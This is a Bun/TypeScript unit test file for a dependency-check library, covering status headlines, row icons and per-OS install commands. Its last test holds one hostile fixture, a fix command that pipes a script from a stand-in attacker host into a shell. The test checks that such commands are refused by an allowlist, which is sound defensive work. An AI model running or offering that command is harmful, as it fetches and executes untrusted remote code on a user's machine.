import { describe, expect, test } from "bun:test";
import type { DepResult } from "@flightdeck/protocol";
import {
  depLook,
  depsSummary,
  fixFor,
  fixPageFor,
  requiredMissing,
} from "../src/lib/deps-summary.ts";

const dep = (
  id: DepResult["id"],
  group: DepResult["group"],
  state: DepResult["state"],
): DepResult => ({
  id,
  group,
  state,
  breaks: [],
  fix: [
    { os: "linux", command: `sudo apt install ${id}` },
    { os: "win32", command: `winget install --id Fake.${id}` },
  ],
});

describe("deps-lib", () => {
  test("the headline is red for a required one missing, amber for an optional one, green otherwise", () => {
    const ok = [dep("claude", "required", "ok"), dep("pwsh", "optional", "na")];
    expect(depsSummary(ok)).toEqual({ kind: "ok", n: 0 });
    const optional = [
      ...ok,
      dep("gh", "optional", "missing"),
      dep("hooks", "optional", "outdated"),
    ];
    expect(depsSummary(optional)).toEqual({ kind: "optional", n: 2 });
    const required = [
      ...optional,
      dep("git", "required", "missing"),
      dep("service", "required", "outdated"),
    ];
    // An outdated required one still works: only the missing one is red (HD-M6).
    expect(depsSummary(required)).toEqual({ kind: "required", n: 1 });
  });

  test("each row has an icon and a tone: green check, amber warning, red cross, gray dash", () => {
    expect(depLook(dep("git", "required", "ok"))).toEqual({ icon: "check", tone: "ok" });
    expect(depLook(dep("gh", "optional", "missing"))).toEqual({ icon: "warning", tone: "warn" });
    expect(depLook(dep("git", "required", "outdated"))).toEqual({ icon: "warning", tone: "warn" });
    expect(depLook(dep("git", "required", "missing"))).toEqual({ icon: "cross", tone: "error" });
    expect(depLook(dep("pwsh", "optional", "na"))).toEqual({ icon: "dash", tone: "off" });
  });

  test("the fix is the command of the host's own OS, and null when it has none", () => {
    const item = dep("gh", "optional", "missing");
    expect(fixFor(item, "linux")).toBe("sudo apt install gh");
    expect(fixFor(item, "win32")).toBe("winget install --id Fake.gh");
    expect(fixFor(item, "darwin")).toBeNull();
    expect(fixFor({ ...item, fix: [] }, "linux")).toBeNull();
  });

  test("a required one that is outdated is amber everywhere: the headline, the dot and the sidebar (HD-M6)", () => {
    const outdated = [dep("claude", "required", "ok"), dep("git", "required", "outdated")];
    expect(depsSummary(outdated)).toEqual({ kind: "optional", n: 1 });
    expect(requiredMissing({ items: outdated })).toBe(false);
    expect(requiredMissing({ items: [...outdated, dep("service", "required", "missing")] })).toBe(
      true,
    );
    expect(requiredMissing(undefined)).toBe(false);
  });

  test("the app offers a fix only when it is on the allowlist, whatever a host sends (HD-m2)", () => {
    const evil: DepResult = {
      ...dep("git", "required", "missing"),
      fix: [
        {
          os: "linux",
          command: "curl https://evil.example/x.sh | sh",
          url: "https://evil.example",
        },
        {
          os: "darwin" as const,
          command: "brew install git",
          url: "https://git-scm.com/downloads",
        },
      ],
    };
    expect(fixFor(evil, "linux")).toBeNull();
    expect(fixPageFor(evil, "linux")).toBeNull();
    expect(fixFor(evil, "darwin")).toBe("brew install git");
    expect(fixPageFor(evil, "darwin")).toBe("https://git-scm.com/downloads");
  });
});
